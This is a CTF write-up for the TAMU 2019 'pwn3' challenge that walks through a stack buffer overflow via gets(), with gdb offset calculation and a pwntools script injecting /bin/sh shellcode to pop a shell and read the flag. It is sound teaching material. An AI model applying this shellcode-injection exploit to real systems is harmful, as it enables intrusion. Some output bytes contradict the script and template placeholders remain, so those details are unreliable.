---
search:
  exclude: true
---
# TAMU 2019 Pwn3

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3
    --2021-03-05 12:37:20--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3
    Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3 [following]
    --2021-03-05 12:37:20--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 7348 (7.2K) [application/octet-stream]
    Saving to: ‘pwn3’
    
    pwn3                                                                   100%[============================================================================================================================================================================>]   7.18K  --.-KB/s    in 0.001s
    
    2021-03-05 12:37:21 (12.1 MB/s) - ‘pwn3’ saved [7348/7348]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → file pwn3
    pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → chmod +x pwn3
    
    
    

` ![]()

## Solution 

First let's execute the binary to see what it does:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → ./pwn3
    Take this, you might need it on your journey 0xfff0aa1e!
    thanks!
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → ./pwn3
    Take this, you might need it on your journey 0xffa9ce0e!
    No Thanks!
    
    

Here we see the binary giving us some text output with a certain memory address, and then prompts us for our text and depending on that text, we might get an answer or not. Now let's view it inside of ghidra:

![](24.png)

We get the following code:
    
    
    undefined4 main(void)
    
    {
      undefined *puVar1;
      
      puVar1 = &stack0x00000004;
      setvbuf(stdout,(char *)0x2,0,0);
      echo(puVar1);
      return 0;
    }
    

Here we see that the important part of the main function is the echo function:
    
    
    /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
    
    void echo(void)
    
    {
      char local_12e [294];
      
      printf("Take this, you might need it on your journey %p!\n",local_12e);
      gets(local_12e);
      return;
    }
    
    

Here we see our input text gets passed into local_12e, and the function prints the address of the char buffer of local_12e. The bug here is that the gets function that is being used to process our input does not have a limit, it won't restrict us no matter how much data we feed through it, so we have an overflow right here. The question is what do we call ? There are not any function that print the flag nor give a shell, This is why we need to feed shellcode in.

Now in the previous challenge we were able to create the shellcode we needed for the x86_64 architecture. However this time we need to take into account that this is a 32 bit binary, we have to follow the x86 architecture as we create our shellcode. For this example we're going to grab some shellcode from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-827.php).

Now let's use gdb to see how much space we have between the start of our input and the return address:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/pwn3]
    → gdb ./pwn3
    GNU gdb (GDB) 10.1
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-pc-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1 using Python engine 3.9
    Reading symbols from ./pwn3...
    (No debugging symbols found in ./pwn3)
    gef➤  disas echo
    Dump of assembler code for function echo:
       0x0000059d <+0>:     push   ebp
       0x0000059e <+1>:     mov    ebp,esp
       0x000005a0 <+3>:     push   ebx
       0x000005a1 <+4>:     sub    esp,0x134
       0x000005a7 <+10>:    call   0x4a0 <__x86.get_pc_thunk.bx>
       0x000005ac <+15>:    add    ebx,0x1a20
       0x000005b2 <+21>:    sub    esp,0x8
       0x000005b5 <+24>:    lea    eax,[ebp-0x12a]
       0x000005bb <+30>:    push   eax
       0x000005bc <+31>:    lea    eax,[ebx-0x191c]
       0x000005c2 <+37>:    push   eax
       0x000005c3 <+38>:    call   0x410 
       0x000005c8 <+43>:    add    esp,0x10
       0x000005cb <+46>:    sub    esp,0xc
       0x000005ce <+49>:    lea    eax,[ebp-0x12a]
       0x000005d4 <+55>:    push   eax
       0x000005d5 <+56>:    call   0x420 
       0x000005da <+61>:    add    esp,0x10
       0x000005dd <+64>:    nop
       0x000005de <+65>:    mov    ebx,DWORD PTR [ebp-0x4]
       0x000005e1 <+68>:    leave
       0x000005e2 <+69>:    ret
    End of assembler dump.
    
    

Now as we disassembled the echo function, we set a breakpoint +61 because this is right after the gets call where we insert our text in.
    
    
    gef➤  b *echo+61
    Breakpoint 1 at 0x5da
    gef➤  r
    Starting program: /home/nothing/binexp/2/pwn3/pwn3
    Take this, you might need it on your journey 0xffffcfbe!
    13371337
    
    Breakpoint 1, 0x565555da in echo ()
    ~/.gef-54e93efd89ec59e5d178fbbeda1fed890098d18d.py:2425: DeprecationWarning: invalid escape sequence '\
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $eax   : 0xffffcfbe  →  "13371337"
    $ebx   : 0x56556fcc  →  0x00001ed4
    $ecx   : 0xf7f90540  →  0xfbad2288
    $edx   : 0xfbad2288
    $esp   : 0xffffcfa0  →  0xffffcfbe  →  "13371337"
    $ebp   : 0xffffd0e8  →  0xffffd0f8  →  0x00000000
    $esi   : 0x1
    $edi   : 0x56555460  →  <_start+0> xor ebp, ebp
    $eip   : 0x565555da  →   add esp, 0x10
    $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffcfa0│+0x0000: 0xffffcfbe  →  "13371337"    ← $esp
    0xffffcfa4│+0x0004: 0xffffcfbe  →  "13371337"
    0xffffcfa8│+0x0008: 0xffffcfff  →  0xffd08000
    0xffffcfac│+0x000c: 0x565555ac  →   add ebx, 0x1a20
    0xffffcfb0│+0x0010: 0x00000000
    0xffffcfb4│+0x0014: 0x00000000
    0xffffcfb8│+0x0018: 0x00000000
    0xffffcfbc│+0x001c: 0x3331b6ff
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
       0x565555ce         lea    eax, [ebp-0x12a]
       0x565555d4         push   eax
       0x565555d5         call   0x56555420 
     → 0x565555da         add    esp, 0x10
       0x565555dd         nop
       0x565555de         mov    ebx, DWORD PTR [ebp-0x4]
       0x565555e1         leave
       0x565555e2         ret
       0x565555e3          lea    ecx, [esp+0x4]
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "pwn3", stopped 0x565555da in echo (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x565555da → echo()
    [#1] 0x5655561a → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤ search-pattern 13371337
    
    

Now that we set the breakpoint, we run the binary, and put in an easy-to remember pattern (13371337) and then we search for that pattern in the memory:
    
    
    gef➤  search-pattern 13371337
    [+] Searching '13371337' in memory
    [+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
      0x565581a0 - 0x565581aa  →   "13371337\n"
    [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
      0xffffcfbe - 0xffffcfc6  →   "13371337"
    
    gef➤  info frame
    Stack level 0, frame at 0xffffd0f0:
     eip = 0x565555da in echo; saved eip = 0x5655561a
     called by frame at 0xffffd110
     Arglist at 0xffffd0e8, args:
     Locals at 0xffffd0e8, Previous frame's sp is 0xffffd0f0
     Saved registers:
      ebx at 0xffffd0e4, ebp at 0xffffd0e8, eip at 0xffffd0ec
    
    

Here we see that the important addresses are **0xffffd0ec** and **0xffffcfbe**. So let's calculate the offset:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/9 ] [binexp/2/pwn3]
    → python3
    Python 3.9.2 (default, Feb 20 2021, 18:40:11)
    [GCC 10.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> hex(0xffffd0ec)
    '0xffffd0ec'
    >>> hex(0xffffd0ec - 0xffffcfbe)
    '0x12e'
    
    

And we see that we have an offset of 0x12e bytes between the start of our input (0xffffcfbe) and the return address (0xffffd0ec). This makes sense because our input value (local_12e) is 294 bytes large,there are 2 saved register values (ebx and ebp) on the stack in between our input and the saved return address which are each 4 bytes a piece (294 + 4 +4 = 0x12e). So with this we can construct our payload : 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/12 ] [binexp/2/pwn3]
    → vim exploit.py
    
    
    
    
    from pwn import *
    
    target = process('./pwn3')
    
    #print the text, up to the address of the start of the input
    print(target.recvuntil("journey "))
    
    #Scan the rest of the line
    leak = target.recvline()
    
    Adr = int(leak.strip(b"!\n"),16)
    
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    
    payload  = b""
    payload += shellcode
    payload += b"\x00" * (0x12e - len(payload))
    payload += p32(Adr)
    
    print(hexdump(payload))
    
    

The plan here is to first push shellcode onto the stack, and we know where it is thanks to the memory address that's given to us, then we fill the gap with nullbytes, and then overwrite the return address to point to the start of our shellcode

Now let's check out our payload:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/13 ] [binexp/2/pwn3]
    → python3 exploit.py
    [+] Starting local process './pwn3': pid 218489
    b'Take this, you might need it on your journey '
    00000000  31 c0 50 68  2f 2f 73 68  68 2f 62 69  6e 89 e3 50  │1·Ph│//sh│h/bi│n··P│
    00000010  53 89 e1 b0  0b cd 80 00  00 00 00 00  00 00 00 00  │S···│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 fe d4  │····│····│····│····│
    00000130  94 ff                                               │··│
    00000132
    
    

Now let's use the following 2 lines to feed our payload into the binary:
    
    
    target.sendline(payload)
    target.interactive()
    
    
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/13 ] [binexp/2/pwn3]
    → python3 exploit.py
    [+] Starting local process './pwn3': pid 524665
    b'Take this, you might need it on your journey '
    00000000  31 c0 50 68  2f 2f 73 68  68 2f 62 69  6e 89 dc 50  │1·Ph│//sh│h/bi│n··P│
    00000010  53 89 cc b0  0b cd 80 00  00 00 00 00  00 00 00 00  │S···│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 1e 27  │····│····│····│···'│
    00000130  d7 ff                                               │··│
    00000132
    [*] Switching to interactive mode
    [*] Got EOF while reading in interactive
    $cat flag.txt
    flag{g0ttem_b0yz}
    $ exit
    [*] Got EOF while reading in interactive
    $ exit
    [*] Process './pwn3' stopped with exit code 0 (pid 524665)
    [*] Got EOF while sending in interactive
    
    
    

And that's it! We have been able to print out the flag.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

